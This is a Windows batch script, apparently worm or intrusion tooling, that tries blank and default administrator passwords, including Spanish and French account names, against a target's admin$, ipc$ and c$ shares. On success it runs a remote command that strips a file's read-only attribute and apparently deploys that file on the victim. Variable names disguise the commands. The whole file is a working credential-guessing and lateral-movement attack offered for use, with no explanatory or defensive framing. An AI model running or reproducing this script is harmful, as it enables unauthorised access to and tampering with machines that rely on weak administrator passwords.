@echo off
set cracker=net use         
set xas=nav
set x=if not errorlevel 1
set z=goto 
set nfo5o=/user:administrator
%cracker% \\%1\admin$ "" %nfo5o% 
%x% %z% f33l
%cracker% \\%1\ipc$ "" %nfo5o% 
%x% %z% f33l
%cracker% \\%1\c$ "" %nfo5o% 
%x% %z% f33l
%cracker% \\%1\admin$ "" /user:admin
%x% %z% f33l
%cracker% \\%1\ipc$ "" /user:admin 
%x% %z% f33l
%cracker% \\%1\c$ "" /user:admin
%x% %z% f33l
%cracker% \\%1\admin$ "" /user:administrador
%x% %z% f33l
%cracker% \\%1\ipc$ "" /user:administrador 
%x% %z% f33l
%cracker% \\%1\c$ "" /user:administrador 
%x% %z% f33l
%cracker% \\%1\admin$ "" /user:administrateur
%x% %z% f33l
%cracker% \\%1\ipc$ "" /user:administrateur 
%x% %z% f33l
%cracker% \\%1\c$ "" /user:administrateur 
%x% %z% f33l
%cracker% \\%1\admin$ "administrator" %nfo5o%
%x% %z% f33l
%cracker% \\%1\ipc$ "administrator" %nfo5o% 
%x% %z% f33l
%cracker% \\%1\c$ "administrator" %nfo5o% 
%x% %z% f33l
%cracker% \\%1\admin$ "admin" %nfo5o%
%x% %z% f33l
%cracker% \\%1\ipc$ "admin" %nfo5o% 
%x% %z% f33l
%cracker% \\%1\c$ "admin" %nfo5o% 
%x% %z% f33l              
goto end
:f33l
%xas% \\%1 attrib.exe -r %2
%xas% \\%1 -f -c -d %2 -o
%xas% \\%1 -d %2 -o
:end
